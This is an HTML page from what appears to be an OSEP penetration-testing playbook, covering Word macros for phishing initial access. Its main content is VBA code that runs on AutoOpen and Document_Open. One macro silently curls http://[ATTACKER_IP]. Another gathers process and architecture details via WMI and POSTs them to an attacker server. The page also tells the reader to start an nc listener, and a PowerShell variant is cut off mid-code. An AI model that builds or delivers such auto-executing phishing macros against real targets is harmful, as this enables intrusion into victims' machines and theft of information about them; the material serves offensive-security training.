<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-osep/initial-access/phishing/microsoft-word" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Microsoft Word (Macros) | OSEP Playbook</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Microsoft Word (Macros) | OSEP Playbook"><meta data-rh="true" name="description" content="Callback Pinging"><meta data-rh="true" property="og:description" content="Callback Pinging"><link data-rh="true" rel="icon" href="/OSEP-Playbook/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word" hreflang="en"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Microsoft Word (Macros)","item":"https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word"}]}</script><link rel="stylesheet" href="/OSEP-Playbook/assets/css/styles.07dfdec4.css">
<script src="/OSEP-Playbook/assets/js/runtime~main.8d70029c.js" defer="defer"></script>
<script src="/OSEP-Playbook/assets/js/main.a9b7b218.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/OSEP-Playbook/"><b class="navbar__title text--truncate">OSEP-PLAYBOOK</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/OSEP-Playbook/docs/osep/scanning/external-nmap">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><a href="https://github.com/hkrsanjeet/OSEP-Playbook" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="OSEP" class="categoryLinkLabel_W154">OSEP</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="Scanning" class="categoryLinkLabel_W154">Scanning</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Initial &amp; Further Access" class="categoryLinkLabel_W154">Initial &amp; Further Access</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Phishing" class="categoryLinkLabel_W154">Phishing</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Send Emails Commands" class="linkLabel_WmDU">Send Emails Commands</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/microsoft-word"><span title="Microsoft Word (Macros)" class="linkLabel_WmDU">Microsoft Word (Macros)</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/JScript"><span title="JScript" class="linkLabel_WmDU">JScript</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/HTA"><span title="HTA" class="linkLabel_WmDU">HTA</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/Payloads/C-sharp"><span title="Payloads" class="categoryLinkLabel_W154">Payloads</span></a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/Upgrading Shells"><span title="Upgrading Shells" class="linkLabel_WmDU">Upgrading Shells</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Tunneling/Ligolo-ng"><span title="Tunneling" class="categoryLinkLabel_W154">Tunneling</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate"><span title="Privilege Esclation" class="categoryLinkLabel_W154">Privilege Esclation</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Defense Evasion/Disable AMSI"><span title="Defense Evasion" class="categoryLinkLabel_W154">Defense Evasion</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><span title="Credentials" class="categoryLinkLabel_W154">Credentials</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Linux" class="categoryLinkLabel_W154">Linux</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Initial Access"><span title="Initial Access" class="linkLabel_WmDU">Initial Access</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Lateral Movement"><span title="Lateral Movement" class="linkLabel_WmDU">Lateral Movement</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Payloads"><span title="Payloads" class="linkLabel_WmDU">Payloads</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"><span title="Privilege Escalation" class="linkLabel_WmDU">Privilege Escalation</span></a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/OSEP-Playbook/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">OSEP</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Initial &amp; Further Access</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Phishing</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Microsoft Word (Macros)</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Microsoft Word (Macros)</h1></header><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="callback-pinging"><strong>Callback Pinging</strong><a href="#callback-pinging" class="hash-link" aria-label="Direct link to callback-pinging" title="Direct link to callback-pinging" translate="no">​</a></h3>
<p><strong>Purpose</strong> This Macros file is just to get a callback from the victim and understand what is happening, it is not ideal for real operations but it is for testing purposes</p>
<p><strong>Code</strong></p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">MyMacro</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim Command As </span><span class="token class-name">String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Command </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;C:\Windows\System32\curl.exe http://[ATTACKER_IP]/worked&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Shell</span><span class="token plain"> Command</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbHide</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Document_Open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    MyMacro</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="determine-target-architecture"><strong>Determine Target Architecture</strong><a href="#determine-target-architecture" class="hash-link" aria-label="Direct link to determine-target-architecture" title="Direct link to determine-target-architecture" translate="no">​</a></h3>
<p><strong>Purpose</strong> We can use special non-malicious Macros to find the architecture of the target and therefore crafting the payloads and stagers correctly avoid running issues. Remember to run <code>nc -nvlp 80</code> prior to delivering them.</p>
<p><strong>Macros Using Curl</strong></p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Option Explicit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">SendProcessInfo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim processName </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> serverUrl </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> wmiService </span><span class="token class-name">As</span><span class="token plain"> Object</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> processList </span><span class="token class-name">As</span><span class="token plain"> Object</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> processItem As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim result </span><span class="token class-name">As</span><span class="token plain"> String</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> is64Bit As </span><span class="token class-name">Boolean</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    serverUrl </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://CHANGE TO YOUR IP&quot;</span><span class="token plain"> &#x27; Change </span><span class="token keyword" style="color:#00009f">this</span><span class="token plain"> to your server </span><span class="token class-name">endpoint</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    processName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;winword.exe&quot;</span><span class="token plain"> &#x27; Replace with your process name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Create WMI query </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">get</span><span class="token plain"> process list</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> wmiService </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;winmgmts:\\.\root\CIMV2&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> processList </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wmiService</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ExecQuery</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT * FROM Win32_Process WHERE Name = &#x27;&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> processName </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&#x27;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Check </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> process </span><span class="token keyword" style="color:#00009f">is</span><span class="token plain"> </span><span class="token class-name">found</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> determine </span><span class="token number" style="color:#36acaa">64</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">bit status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    If processList</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Count </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> Then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        For Each processItem In </span><span class="token class-name">processList</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            is64Bit </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">InStr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> processItem</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">CommandLine</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Program Files (x86)&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbTextCompare</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Process: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> processName </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;, 64-bit: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CStr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">is64Bit</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Next</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Else</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;Process not found.&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    End If</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &#x27; Execute cURL command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Shell </span><span class="token string" style="color:#e3116c">&quot;cmd.exe /c curl -X POST -d &quot;</span><span class="token plain">&quot;</span><span class="token string" style="color:#e3116c">&quot; &amp; result &amp; &quot;</span><span class="token plain">&quot;</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> serverUrl</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> vbHide</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">AutoOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SendProcessInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">DocumentOpen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SendProcessInfo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">End Sub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>Macros Using PowerShell</strong></p>
<div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Option Explicit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token return-type class-name">Sub</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">SendProcessInfo</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim processName As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim is64Bit As Boolean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim result As String</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim wmiService As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim processList As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim processItem As Object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Dim psCommand As </span><span class="token class-name">String</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    processName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;explorer.exe&quot;</span><span class="token plain"> &#x27; Use uppercase </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> process name </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> consistency</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> wmiService </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;winmgmts:\\.\root\CIMV2&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">Set</span><span class="token plain"> processList </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> wmiService</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ExecQuery</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" 